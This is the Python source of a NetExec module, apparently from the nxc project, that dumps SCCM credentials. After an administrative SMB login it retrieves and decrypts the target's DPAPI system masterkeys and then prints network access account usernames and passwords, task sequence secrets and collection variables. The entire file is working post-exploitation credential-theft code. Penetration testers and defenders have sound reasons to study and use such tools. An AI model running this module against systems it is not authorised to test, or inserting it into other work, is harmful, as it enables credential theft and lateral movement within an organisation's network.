from dploot.triage.masterkeys import MasterkeysTriage
from dploot.lib.target import Target
from dploot.lib.smb import DPLootSMBConnection
from dploot.triage.sccm import SCCMTriage, SCCMCollection, SCCMCred, SCCMSecret

from nxc.helpers.logger import highlight


class NXCModule:
    """
    Example:
    -------
    Module by @zblurx
    """

    name = "sccm"
    description = "Dump SCCM Credentials"
    supported_protocols = ["smb"] 
    opsec_safe = True
    multiple_hosts = True

    def __init__(self, context=None, module_options=None):
        self.context = context
        self.module_options = module_options

    def options(self, context, module_options):
        """Required.
        Module options get parsed here. Additionally, put the modules usage here as well
        """

    def on_admin_login(self, context, connection):
        host = connection.hostname + "." + connection.domain
        domain = connection.domain
        username = connection.username
        kerberos = connection.kerberos
        aesKey = connection.aesKey
        use_kcache = getattr(connection, "use_kcache", False)
        password = getattr(connection, "password", "")
        lmhash = getattr(connection, "lmhash", "")
        nthash = getattr(connection, "nthash", "")

        target = Target.create(
            domain=domain,
            username=username,
            password=password,
            target=host,
            lmhash=lmhash,
            nthash=nthash,
            do_kerberos=kerberos,
            aesKey=aesKey,
            no_pass=True,
            use_kcache=use_kcache,
        )

        conn = None

        try:
            conn = DPLootSMBConnection(target)
            conn.smb_session = connection.conn
        except Exception as e:
            context.log.debug(f"Could not upgrade connection: {e}")
            return

        masterkeys = []
        try:
            masterkeys_triage = MasterkeysTriage(target=target, conn=conn)
            masterkeys += masterkeys_triage.triage_system_masterkeys()
        except Exception as e:
            context.log.debug(f"Could not get masterkeys: {e}")

        if len(masterkeys) == 0:
            context.log.fail("No masterkeys looted")
            return

        context.log.success(f"Got {highlight(len(masterkeys))} decrypted masterkeys. Looting SCCM Credentials")
        try:
            # Collect Chrome Based Browser stored secrets
            sccm_triage = SCCMTriage(target=target, conn=conn, masterkeys=masterkeys)
            sccm_creds = sccm_triage.triage_sccm()
            for credential in sccm_creds:
                if isinstance(credential,SCCMCred):
                    context.log.highlight(f"[NAA Account] {credential.username.decode('latin-1')}:{credential.password.decode('latin-1')}")
                elif isinstance(credential,SCCMSecret):
                    context.log.highlight(f"[Task sequences secret] {credential.secret.decode('latin-1')}")
                elif isinstance(credential,SCCMCollection):
                    context.log.highlight(f"[Collection Variable] {credential.variable.decode('latin-1')}:{credential.value.decode('latin-1')}")
        except Exception as e:
            context.log.debug(f"Error while looting wifi: {e}")
